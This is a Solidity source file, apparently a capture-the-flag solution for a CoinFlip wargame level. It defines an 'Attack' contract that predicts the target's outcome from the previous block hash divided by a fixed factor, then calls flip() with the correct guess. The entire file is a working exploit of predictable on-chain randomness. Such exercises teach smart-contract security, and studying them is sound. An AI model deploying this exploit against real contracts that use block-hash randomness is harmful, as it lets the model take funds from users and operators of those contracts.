// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "hardhat/console.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}
contract Attack {
  using SafeMath for uint256;

  // constructor() public{}

  function attack(address _coinFlip) public returns (bool){
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 value = blockValue.div(FACTOR);
    bool guess = value == 1 ? true : false;
    bool result = ICoinFlip(_coinFlip).flip(guess);
    return result;
  }
}
